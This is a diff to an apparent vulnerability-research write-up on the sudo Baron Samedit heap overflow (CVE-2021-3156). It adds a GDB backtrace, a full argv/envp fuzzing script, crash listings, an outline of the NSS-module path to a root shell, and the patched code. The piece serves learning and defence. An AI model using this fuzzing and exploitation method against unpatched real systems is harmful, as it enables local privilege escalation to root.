@@ -126,6 +126,19 @@ Here, `r14` and `r15` hold pointers to the input strings. `r15` is advanced to d
 
 The problem happens when the backslash is the last character of a string. In that case, the null byte after the backslash is skipped. As a result, the program continues copying data from the next argument instead of stopping at the end of the current string. This eventually causes a heap overflow.
 
+```bash
+pwndbg> bt
+#0  set_cmnd () at ./sudoers.c:864
+#1  sudoers_policy_main (argc=argc@entry=2, argv=argv@entry=0x7ffeaa32dd10, pwflag=pwflag@entry=0, env_add=env_add@entry=0x0, verbose=verbose@entry=false, closure=closure@entry=0x7ffeaa32da20) at ./sudoers.c:306
+#2  0x000059d883558437 in sudoers_policy_check (argc=2, argv=0x7ffeaa32dd10, env_add=0x0, command_infop=0x7ffeaa32da98, argv_out=0x7ffeaa32daa0, user_env_out=0x7ffeaa32daa8) at ./policy.c:872
+#3  0x000059d883533426 in policy_check (plugin=0x59d8835af800 <policy_plugin>, user_env_out=0x7ffeaa32daa8, argv_out=0x7ffeaa32daa0, command_info=0x7ffeaa32da98, env_add=0x0, argv=0x7ffeaa32dd10, argc=2) at ./sudo.c:1138
+#4  main (argc=argc@entry=3, argv=argv@entry=0x7ffeaa32dd08, envp=0x7ffeaa32dd28) at ./sudo.c:253
+#5  0x00007879457df083 in __libc_start_main (main=0x59d883532af0 <main>, argc=3, argv=0x7ffeaa32dd08, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffeaa32dcf8) at ../csu/libc-start.c:308
+#6  0x000059d88353484e in _start () at ./sudo.c:735
+pwndbg>
+
+```
+
 ### II. Validating the Bug
 
 I used the following script to attach GDB to the process and break at the relevant source lines:
@@ -236,31 +249,7 @@ These were the function pointers I found:
 Then I ran `check.py`, a script I had written the day before to place the heap into a useful state:
 
 ```python
-import os, subprocess, signal
 
-open("/tmp/g.gdb", "w").write(
-"""
-        set disable-randomization on
-        set breakpoint pending on
-        b /pwd/sudo-1.8.31p2/plugins/sudoers/sudoers.c:868
-        b /pwd/sudo-1.8.31p2/plugins/sudoers/sudoers.c:872
-        continue
-        continue
-        continue
-
-""")
-
-p = subprocess.Popen(
-    args=['/usr/bin/sudoedit', '-s', 'A' * 0x20 + '\\'])
-p.send_signal(signal.SIGSTOP)
-
-
-os.execvp("gdb", [
-        "gdb",
-        "-q",
-        "-x", "/tmp/g.gdb",
-        "-p", str(p.pid)
-])
 ```
 
 This produced a crash:
@@ -554,9 +543,287 @@ From this testcase, we can see that `user_args` is placed before some interestin
 
 So I decided to give up on this specific idea for now. Instead of trying to force this layout to work, I started developing a new fuzzing script with more environment variables. The goal was to influence the heap layout more aggressively and collect better crashes. Based on those future crashes, I could work backward and find a more realistic way to attack the binary.
 
--------------------------------------------------------TO-BE-CONTINUE-------------------------------------------------------------
+The overall idea was straightforward:
+
+Fuzz the heap into different layouts by varying argv and envp.
+Collect crashes that are both reproducible and stable.
+Analyze the corresponding execution paths in depth.
+Eventually identify a controllable primitive that can be turned into a working exploit.
+
+To explore different heap layouts, I used the following fuzzing script:
+
+```python
+import subprocess
+import time
+import select
+import random
+import os
+import json
+from pathlib import Path
+
+seed = time.time()
+print(seed)
+random.seed(seed)
+
+FOLDER = 'crash'
+
+# define some common size values usable for different inputs
+_SIZES = [i for i in range(0,0xff)]
+_SIZES += [2**i for i in range(0,15)]
+_SIZES += [(2**i)+1 for i in range(0,15)]
+_SIZES += [(2**i)-1 for i in range(0,15)]
+_SIZES += ([0]*50)
+
+# define some flags from sudo -h
+ARG1 = ["-A","-B","-E","-e","-H","-K","-k","-l","-n","-P","-S","-s"]
+ARG1 += [None, None, None, None, None, None, None]
+
+# dump a testcase into a logfile
+def dump_file(fname, lines, backtrace, arg, env):
+
+    # create the folders if they don't exist
+    directory = os.path.dirname(fname)
+    if not os.path.exists(directory):
+        os.makedirs(directory)
+    
+    # don't write the dump file if it's already too large
+    if os.path.isfile(fname) and Path(fname).stat().st_size > 200000:
+        return
+
+    with open(fname, 'a+') as f:
+        f.write("----------------------------\n")
+        f.write(lines)
+        f.write("\nbacktrace:\n")
+        f.write("\n".join(backtrace))
+        f.write("\n\n")
+
+# this will run sudoedit to check if it crashes
+def sudoedit_crash_check(arg,env):
+    p = subprocess.Popen(["/usr/bin/stdbuf","-o0","/usr/local/bin/sudoedit"]+arg, 
+        env=env, bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    try:
+        lines = p.communicate(b"x\nx\nx\nx\n",timeout=0.1)
+    except subprocess.TimeoutExpired:
+        p.terminate()
+        lines = p.communicate()
+
+    for out in lines:
+        if b'malloc' in out or b'corrupt' in out or b'free()' in out or b'munmap_chunk()' in out or b'mremap_chunk()' in out:
+            # currently not interested in aborts
+            #return 'heap:abort'
+            return False
+
+    if p.returncode == -11:
+        return 'segfault'
+
+    return False
+
+# this will run sudoedit in gdb to analyse the heap objects
+def run_sudoedit(arg, env):
+    print("-------------")
+    # call gdb and load the sudoedit gef extension
+    _cmd = ["/usr/bin/gdb"]
+    _cmd += ["-ex", 'source /pwd/gef/sudoedit.py']
+    _cmd += ["-ex", "set breakpoint pending on"]
+    # add the environment vars within gdb
+    _cmd += ["-ex", "unset environment"]
+    for e in env:
+        _cmd += ["-ex", f"set environment {e} = {env[e]}"]
+    # execute the heap trace exension
+    _cmd += ["-ex", "sudoedit"]
+    # run sudoedit
+    _cmd += ["-ex", "r "+" ".join([f"'{a}'" for a in arg])]
+    #_cmd += ["-ex", "bt"]
+    _cmd += ["-ex", "continue"]
+    _cmd += ["-ex", "echo BACKTRACE_START_HERE\n"]
+    _cmd += ["-ex", "bt"]
+    _cmd += ["-ex", "echo BACKTRACE_END_HERE\n"]
+    _cmd += ["/usr/local/bin/sudoedit"]
+
+    # execute it
+    p = subprocess.Popen(_cmd, bufsize=0, 
+            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    try:
+        # send some newlines and check if we get any output
+        lines = p.communicate(b"x\nx\nx\nx\n", timeout=4)
+    except subprocess.TimeoutExpired:
+        # terminate on timeout
+        p.terminate()
+        lines = p.communicate()
+    
+    reason = 'weird'
+    backtrace = []
+    in_backtrace = False
+    for line in lines[0].splitlines():
+        print(line.decode('utf-8'))
+        if b'SIGSEGV, Segmentation fault' in line:
+            reason = 'segfault'
+        if b'SIGABRT, Aborted' in line:
+            reason = 'abort'
+
+        if b'BACKTRACE_END_HERE' in line:
+            in_backtrace = False
+        if in_backtrace:
+            backtrace.append(line.decode('utf-8'))
+        if b'BACKTRACE_START_HERE' in line:
+            in_backtrace = True
+
+    if os.path.isfile('/tmp/heap'):
+
+        # read the heap data collected by the gef extension
+        """
+        example /tmp/heap
+        sudoersparse sudo_file_parse sudoers_policy_init sudoers_policy_open policy_open out>,
+        push_include_int sudoerslex sudoersparse sudo_file_parse sudoers_policy_init sudoers_policy_open policy_open out>,
+        sudo_getgrouplist2_v1 fill_group_list <user_details>) <user_details>) main
+        """
+        with open('/tmp/heap','r') as f:
+            heap = f.read()
+            lines = heap.splitlines()
+        
+        # extract the backtrace from the crash location
+        _backtrace_short = ' '.join([i.split()[3] for i in backtrace if len(i.split())>3 and i.split()[1].startswith('0x')])
+        # shorten the backtrace to use as a filename
+        backtrace_short = "".join(x for x in _backtrace_short if x.isalnum() or x==' ' or x=='_')[:100]
+        
+        # take the filename based on the backtrace
+        # fname = f"{FOLDER}/{reason}:{backtrace_short}"
+        
+        # take the filename from the first heap object after our buffer
+        fname = f"{FOLDER}/{reason}:{backtrace_short}"
+        dump_file(fname, heap, backtrace, arg, env)
+
+        # dump the args and env in a .json file for automated reproduction
+        with open(f'{FOLDER}/{reason}:{backtrace_short}.json', 'a+') as f:
+            test = {}
+            test['arg'] = arg
+            test['env'] = env
+            f.write(json.dumps(test))
+            f.write('\n')
+
+            
+ALPHABET = '0123456789ABCDEFGHIKLMNOPQRSTUVWXYZ'
+# fuzz loop
+while True:
+    # select random size values
+    arg1 = random.choice(ARG1)
+    rand_arg2_size = random.choice(_SIZES)
+    rand_arg3_size = random.choice(_SIZES)
+    # random sizes for env vars
+    rand_envKey_size, rand_envVal_size = random.choice(_SIZES), random.choice(_SIZES)
+    rand_LC_ALL_size = random.choice(_SIZES)
+    rand_LOCPATH_size = random.choice(_SIZES)
+    rand_TZ_size = random.choice(_SIZES)
+    arg = []
+    env = {}
+
+    # arguments
+    # ... -s AAAAAAA\ ...
+    if arg1:
+        arg.append(arg1)
+    arg.append("-s")
+    arg.append(random.choice(ALPHABET)*rand_arg2_size + "\\")
+    if rand_arg3_size:
+        arg.append(random.choice(ALPHABET)*rand_arg3_size)
+        
+    # environment variables
+    if rand_LC_ALL_size:
+        env["LC_ALL"] = random.choice(ALPHABET)*rand_LC_ALL_size
+    if rand_LOCPATH_size:
+        env["LOCPATH"] = random.choice(ALPHABET)*rand_LOCPATH_size
+    if rand_TZ_size:
+        env["TZ"] = random.choice(ALPHABET)*rand_TZ_size
+    if rand_envKey_size:
+        env[random.choice(ALPHABET)*rand_envKey_size] = random.choice(ALPHABET)*rand_envVal_size
+        
+    # check if sudoedit crashes
+    crash = sudoedit_crash_check(arg, env)
+    if crash:
+        print(f"we got a {crash}, check heap")
+        run_sudoedit(arg, env)
+
+```
+
+This fuzzing framework was originally written by LiveOverflow, and I would like to thank him for the excellent guidance. Through this series, I learned a great deal about how to design fuzzing scripts for binaries whose behavior heavily depends on the interaction between argv and envp.
+
+sudo is a particularly challenging target for me. Its initialization process involves numerous allocations, environment variables, configuration parsing, and interactions with glibc internals, making both debugging and reasoning about the heap layout difficult. The methodology demonstrated by LiveOverflow provided an excellent example of how a vulnerability researcher approaches such a complex binary: first generate diverse states, then classify crashes, and finally investigate the most promising ones instead of attempting to understand the entire codebase at once.
+
+Oke, let check the crashes:
+
+```bash
+root:/pwd# cd crash/
+root:/pwd/crash# ls
+'abort:__GI_abort __libc_message malloc_printerr _int_free free_member free_privilege free_userspec free_us'
+'abort:__GI_abort __libc_message malloc_printerr _int_free free_member free_privilege free_userspec free_us.json'
+'abort:__GI_abort __libc_message malloc_printerr munmap_chunk __GI__IO_str_overflow __GI__IO_default_xsputn'
+'abort:__GI_abort __libc_message malloc_printerr munmap_chunk __GI__IO_str_overflow __GI__IO_default_xsputn.json'
+'abort:__GI_abort __libc_message malloc_printerr munmap_chunk _nss_files_initgroups_dyn internal_getgroupli'
+'abort:__GI_abort __libc_message malloc_printerr munmap_chunk _nss_files_initgroups_dyn internal_getgroupli.json'
+'abort:__GI_abort __libc_message malloc_printerr munmap_chunk free_member free_privilege free_userspec free'
+'abort:__GI_abort __libc_message malloc_printerr munmap_chunk free_member free_privilege free_userspec free.json'
+'segfault:    set_cmnd sudoers_policy_check policy_check'
+'segfault:    set_cmnd sudoers_policy_check policy_check.json'
+'segfault:  set_cmnd sudoers_policy_check policy_check'
+'segfault:  set_cmnd sudoers_policy_check policy_check.json'
+'segfault:_IO_cleanup __run_exit_handlers __GI_exit main'
+'segfault:_IO_cleanup __run_exit_handlers __GI_exit main.json'
+'segfault:_IO_flush_all_lockp _IO_cleanup __run_exit_handlers __GI_exit main'
+'segfault:_IO_flush_all_lockp _IO_cleanup __run_exit_handlers __GI_exit main.json'
+'segfault:_IO_new_fclose sudo_file_close sudoers_cleanup do_cleanup sudo_fatalx_nodebug_v1 tgetpass sudo_conve'
+'segfault:_IO_new_fclose sudo_file_close sudoers_cleanup do_cleanup sudo_fatalx_nodebug_v1 tgetpass sudo_conve.json'
+'segfault:__GI__IO_default_finish _IO_new_fclose sudo_file_close sudoers_cleanup do_cleanup sudo_fatalx_nodebu'
+'segfault:__GI__IO_default_finish _IO_new_fclose sudo_file_close sudoers_cleanup do_cleanup sudo_fatalx_nodebu.json'
+'segfault:__GI__IO_free_backup_area _IO_new_file_close_it _IO_new_fclose sudo_file_close sudoers_cleanup do_cl'
+'segfault:__GI__IO_free_backup_area _IO_new_file_close_it _IO_new_fclose sudo_file_close sudoers_cleanup do_cl.json'
+'segfault:__GI___libc_free _IO_deallocate_file sudo_file_close sudoers_cleanup do_cleanup sudo_fatalx_nodebug_'
+'segfault:__GI___libc_free _IO_deallocate_file sudo_file_close sudoers_cleanup do_cleanup sudo_fatalx_nodebug_.json'
+'segfault:__GI___libc_free _nss_files_initgroups_dyn internal_getgrouplist getgrouplist sudo_getgrouplist2_v1 '
+'segfault:__GI___libc_free _nss_files_initgroups_dyn internal_getgrouplist getgrouplist sudo_getgrouplist2_v1 .json'
+'segfault:__GI___libc_free free_member free_privilege free_userspec free_userspecs free_parse_tree sudo_file_c'
+'segfault:__GI___libc_free free_member free_privilege free_userspec free_userspecs free_parse_tree sudo_file_c.json'
+'segfault:__GI___nss_database_lookup2 __GI___nss_shadow_lookup2 setup setspent sudo_setspent sudo_passwd_init '
+'segfault:__GI___nss_database_lookup2 __GI___nss_shadow_lookup2 setup setspent sudo_setspent sudo_passwd_init .json'
+'segfault:__GI___nss_lookup_function internal_getgrouplist getgrouplist sudo_getgrouplist2_v1 sudo_make_gidlis'
+'segfault:__GI___nss_lookup_function internal_getgrouplist getgrouplist sudo_getgrouplist2_v1 sudo_make_gidlis.json'
+'segfault:__dcigettext __GI___dcgettext display_lecture check_user_interactive sudoers_policy_main sudoers_pol'
+'segfault:__dcigettext __GI___dcgettext display_lecture check_user_interactive sudoers_policy_main sudoers_pol.json'
+'segfault:__dcigettext __GI___dcgettext vlog_warning log_warningx log_auth_failure check_user_interactive sudo'
+'segfault:__dcigettext __GI___dcgettext vlog_warning log_warningx log_auth_failure check_user_interactive sudo.json'
+'segfault:free_parse_tree sudo_file_close sudoers_cleanup do_cleanup sudo_fatalx_nodebug_v1 tgetpass sudo_conv'
+'segfault:free_parse_tree sudo_file_close sudoers_cleanup do_cleanup sudo_fatalx_nodebug_v1 tgetpass sudo_conv.json'
+'segfault:free_userspec free_userspecs free_parse_tree sudo_file_close sudoers_cleanup do_cleanup sudo_fatalx_'
+'segfault:free_userspec free_userspecs free_parse_tree sudo_file_close sudoers_cleanup do_cleanup sudo_fatalx_.json'
+'segfault:free_userspecs free_parse_tree sudo_file_close sudoers_cleanup do_cleanup sudo_fatalx_nodebug_v1 tge'
+'segfault:free_userspecs free_parse_tree sudo_file_close sudoers_cleanup do_cleanup sudo_fatalx_nodebug_v1 tge.json'
+'segfault:nss_new_service __GI___nss_lookup_function __GI___nss_lookup setup setspent sudo_setspent sudo_passw'
+'segfault:nss_new_service __GI___nss_lookup_function __GI___nss_lookup setup setspent sudo_setspent sudo_passw.json'
+'segfault:set_cmnd sudoers_policy_check policy_check'
+'segfault:set_cmnd sudoers_policy_check policy_check.json'
+'segfault:sudoers_lookup_check sudoers_policy_main sudoers_policy_check policy_check'
+'segfault:sudoers_lookup_check sudoers_policy_main sudoers_policy_check policy_check.json'
+'segfault:sudoers_policy_check policy_check'
+'segfault:sudoers_policy_check policy_check.json'
+ weird:
+ weird:.json
+'weird:__tcsetattr tcsetattr_nobg sudo_term_noecho_v1 tgetpass sudo_conversation auth_getpass verify_user c'
+'weird:__tcsetattr tcsetattr_nobg sudo_term_noecho_v1 tgetpass sudo_conversation auth_getpass verify_user c.json'
+root:/pwd/crash#
+
+```
+From the collected crashes, we can see that many of them involve `__nss_lookup_function` or functions called from it. Since the same subsystem appears repeatedly, it seems like a good place to start our investigation.
+
+So the next question naturally becomes:
+
+What is NSS?
+
+NSS (Name Service Switch) is a glibc mechanism used to decide where user, group, host, and shadow information should be loaded from. For example, user information can come from local files such as `/etc/passwd` and `/etc/shadow`, or from external services such as LDAP.
+
+In this case, `sudo` uses NSS because it needs to look up user and authentication-related information. That is why functions like `setspent`, `nss_lookup_function`, and `nss_new_service` appear in the crash path.
 
 ## My own exploitation
+
+The idea is fairly straightforward: carefully pad `argv` and `envp` to shape the heap layout, corrupt the NSS service name, and make the dynamic loader load a controlled NSS module. Once the module is loaded, its constructor runs with elevated privileges, calls `setuid(0)`/`setgid(0)`, and finally executes `/bin/sh -p` via `execve`.
 
 ```c
 //exploit.c
@@ -693,3 +960,41 @@ static void __attribute__((constructor)) init(void) {
 }
 
 ```
+
+## The patched version
+
+```c
+if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL) &&
+    ISSET(sudo_mode, MODE_RUN))
+```
+
+This prevents sudoedit / MODE_EDIT from reaching the shell-mode unescaping path.
+
+```c
+if (from[0] == '\\' && from[1] != '\0' &&
+    !isspace((unsigned char)from[1]))
+    from++;
+```
+
+This fixes the single-backslash case by making sure the next byte is not NUL before skipping the backslash.
+
+```c
+if (size - (to - user_args) < 1) {
+    sudo_warnx(U_("internal error, %s overflow"), __func__);
+    debug_return_int(NOT_FOUND_ERROR);
+}
+```
+This adds a bounds check before writing into user_args.
+
+## References
+
+* LiveOverflow, *CVE-2021-3156 sudo Baron Samedit* video series:
+  `https://www.youtube.com/watch?v=TLa2VqcGGEQ&list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx`
+
+* CVE-2021-3156 report by Nguyen Tuong Hung:
+  `https://ngtuonghung.github.io`
+  Note: I could not access this report at the time of writing, but it was still useful as a reference point during my research.
+
+* The Fuzzing Project:
+  `https://fuzzing-project.org/`
+
